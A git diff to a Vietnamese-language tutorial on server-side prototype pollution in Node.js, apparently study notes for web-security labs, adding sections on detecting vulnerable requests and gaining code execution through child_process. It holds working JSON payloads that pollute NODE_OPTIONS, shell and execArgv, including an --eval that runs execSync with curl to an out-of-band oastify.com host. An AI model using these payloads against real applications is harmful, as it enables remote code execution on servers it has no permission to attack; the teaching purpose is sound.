@@ -270,5 +270,34 @@ Node application cũng có thể delete hoặc disable `__proto__` bằng cách 
 ### Identifying a vulnerable request
 Có một số khả năng thực thi lệnh chìm trong Node, nhiều trong số đó xảy ra trong modul child_process. Chúng thường được gọi bởi một request xảy ra không đồng bộ với request mà bạn có thể làm pollution prototype ngay từ đầu. Do đó, cách tốt nhất để xác định các request này là làm polluting the prototype bằng payload kích hoạt tương tác với Burp Collaborator khi được gọi.
 
+Biến môi trường NODE_OPTIONS cho phép bạn xác định một chuỗi các đối số dòng lệnh (ví dụ -l, --help)  sẽ được sử dụng theo mặc định bất cứ khi nào bạn bắt đầu một  Node process mới. Vì đây cũng là một property trên Object `env`, bạn có khả năng kiểm soát điều này thông qua prototype pollution nếu nó không được xác định.
+
+Một số function của Node để tạo child processes mới chấp nhận một `shell` property tùy chọn, cho phép các nhà phát triển đặt một shell cụ thể, chẳng hạn như bash, để chạy các lệnh trong đó. Bằng cách kết hợp điều này với một property NODE_OPTIONS độc hại, bạn có thể làm polluting the prototype theo cách gây ra tương tác với Burp Collaborator bất cứ khi nào một Node process mới được tạo:
+```
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+
 ### Remote code execution via child_process.fork()
+Các method như child_process.spawn() và child_process.fork()cho phép các nhà phát triển tạo các Node subprocesses mới. fork() method chấp nhận một options object trong đó một trong các option tiềm năng là execArgv property. Đây là một mảng các chuỗi chứa các đối số dòng lệnh nên được sử dụng khi sinh ra child process.
+
+Vì gadget này cho phép bạn kiểm soát trực tiếp các đối số dòng lệnh, điều này cho phép bạn truy cập vào một số hướng tấn công không thể thực hiện được bằng cách sử dụng NODE_OPTIONS. Quan tâm đặc biệt là argument --eval, cho phép bạn chuyển JavaScript tùy ý sẽ được execute bởi child process.
+```
+"execArgv": [
+    "--eval=require('<module>')"
+]
+```
+Ngoài ra child_process module chứa  `execSync()` method cho phép thực thi 1 chuỗi tùy ý như system command
+```
+"__proto__":{
+"execArgv":[
+"--eval=require('child_process').execSync('curl https://9u4l6ql2wop2yueibnnqeswumlscg74w.oastify.com')"
+]
+}
+```
+
 ### Remote code execution via child_process.execSync()
+child_process.execSync() cũng giống như child_process.fork(), đều chấp nhận option object. Tuy nó không có execArgv property nhưng lại có `shell` và `input` property
+
